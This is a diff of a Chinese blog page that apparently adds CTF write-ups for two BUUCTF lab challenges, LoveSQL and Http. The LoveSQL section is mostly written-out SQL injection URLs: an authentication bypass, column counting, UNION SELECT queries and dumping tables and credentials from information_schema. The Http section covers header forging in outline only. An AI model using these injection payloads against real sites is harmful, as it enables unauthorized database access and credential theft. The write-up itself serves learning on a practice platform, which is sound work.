@@ -489,21 +489,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-03
+                    2023-01-04
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    952
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    4 分
+                    6 分
                 </div>
                 
 
@@ -595,6 +595,12 @@
 <blockquote>
 <p>PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZTNlZDgxOGYtZjM4MS00OWFjLThjNDEtOTMzOTE2ZmVjZGJjfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo&#x3D;<br>解密之后得到flag。</p>
 </blockquote>
+<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><p><img src="https://img-blog.csdnimg.cn/ac670dfd41f2450a8d5ca02b5e9d3dc9.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/404c661805b048e39d33a2094a1ca0c7.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/8bd81110c54a4d93b1977ffb225654d3.png" alt="3">直接万能密码<br><img src="https://img-blog.csdnimg.cn/d90fecebb74646dcbf7f0067f51afab6.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/f766ec5a93624dcaa587c5b8b7572887.png" alt="5"><br>密码md5解密不解密都不能用，题目既然是LoveSQL，那就开始最基础的操作<br>查看有几列<code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 4%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/aa0456adb9c04bb49d67511f09994f1d.png" alt="5"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=admin&#39;  order by 3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/8a28e495e33e4fe3957bbdb7906bcf14.png" alt="6"><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,2,3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/760edddc69cb4cb2b42c44d75e69b35b.png" alt="7"><br>在2和3位置注入<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-admin&#39;  union select 1,database(),3%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/153c23c6528f42e3a70789972ce64e9a.png" alt="8"><br><strong>爆破表名：</strong><br> <code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/70b3fb676e0b4563b3f2bd70506e1390.png" alt="9"><br><strong>geekuser</strong>和<strong>l0ve1ysq1</strong>，先看第一个，<br><strong>爆破列名：</strong><br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;geekuser&#39;%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/c4f226dea1934756b7a81508108a96f4.png" alt="10"><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM geekuser%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/3cb3400a84e147568c891de1ffeddd5a.png" alt="11">不对，看另一个表<br><code>http://b6bfc17f-4691-4790-8b08-554a90ccfc9a.node4.buuoj.cn:81/check.php?username=-1&#39; union select 1,2,group_concat(id,username,password) FROM l0ve1ysq1%23&amp;password=1&#39; or&#39;1&#39;=&#39;1</code><br><img src="https://img-blog.csdnimg.cn/953a9aa4e16446e8b2013e713a20350b.png" alt="12"></p>
+<p>得到flag。</p>
+<h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>就是一个页面，看了一遍没啥，看看源码：</p>
+<p><img src="https://img-blog.csdnimg.cn/b4f8a8a9ad7b479b87433f35e4a099d5.png" alt="1"><br>有secret.php文件<br><img src="https://img-blog.csdnimg.cn/950d2fd795e44872959f455c67bea634.png" alt="2">需要伪造，开始抓包改包</p>
+<p><img src="https://img-blog.csdnimg.cn/413437df593244f88a61ca81d55ac52b.png" alt="4"><img src="https://img-blog.csdnimg.cn/2539fa128ac14f49813b00779ced60f1.png" alt="在这里插入图片描述"></p>
+<p>继续改<br><img src="https://img-blog.csdnimg.cn/ca8fb6a9b04a44889273265f2145ace4.png" alt="5"><br>本地代理开启<br><img src="https://img-blog.csdnimg.cn/a430853e4d5f49b080bf1273ade3b6c4.png" alt="5"></p>
 
                 
             </div>
@@ -1432,7 +1438,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">12.5k</span>&nbsp;字
+                class="white-color">12.9k</span>&nbsp;字
             
             
             
